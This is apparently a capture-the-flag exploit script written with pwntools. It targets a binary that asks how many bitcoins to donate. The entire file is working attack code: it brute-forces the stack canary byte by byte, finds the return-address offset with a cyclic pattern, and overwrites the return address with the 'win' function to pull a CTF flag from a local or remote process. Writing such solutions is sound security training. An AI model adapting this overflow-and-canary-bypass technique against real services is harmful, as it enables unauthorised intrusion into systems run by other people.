
from pwn import *
from tqdm import tqdm

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST
port = int(args.PORT)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


BUF_SIZE = 68
FLAG_SIZE = 64
CANARY_SIZE = 8

FILLER_LEN = BUF_SIZE + CANARY_SIZE

def brute_force_canary():
    canary = b""
    for i in range(CANARY_SIZE):
        progress = tqdm(string.ascii_letters + string.digits, desc="Bruteforcing character %i" % (i + 1))
        for c in progress:
            c = str.encode(c)
            with context.local(log_level='ERROR'):
                try:
                    io = start()
                    io.sendlineafter(b"[+] How Many Bitcoins You Wish to Donate?\n> ",  str.encode(str(BUF_SIZE + len(canary) +1)))
                    io.sendlineafter(b"[+]Your Wallet :", fit({BUF_SIZE: canary + c}))
                    response = io.recvline()
                    if b"Stack Smashing Detected" in response:
                        continue
                    canary += c
                    progress.write("Found character %i of canary: %s" % (i+1, c))
                    break
                finally:
                    io.close()
        else:
            raise Exception("Can't find canary")
    return canary

def send_payload(proc, payload, canary):
    assert(len(canary) == CANARY_SIZE)
    proc.sendlineafter(b"[+] How Many Bitcoins You Wish to Donate?\n> ", str(FILLER_LEN + len(payload)))
    proc.sendafter(b"[+]Your Wallet :", (b'A' * BUF_SIZE) + (canary) + payload)

def get_overflow_offset(canary):
    proc = process(exe.path)
    payload = cyclic(100, n=exe.bytes)
    send_payload(proc, payload, canary)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
    log.info("Overflow offset: %i", offset)
    return offset

canary = brute_force_canary()
log.info("Canary: {}".format(canary))

overflow_offset = get_overflow_offset(canary)

payload = fit({overflow_offset: p32(exe.symbols["win"])})
log.info("Sending payload: \n{}".format(hexdump(payload)))

io = start()
send_payload(io, payload, canary)
output = io.recvuntil(b"}")

flag = re.search("CTF{.*?}", output.decode("ascii")).group()
log.success("Flag %s", flag)
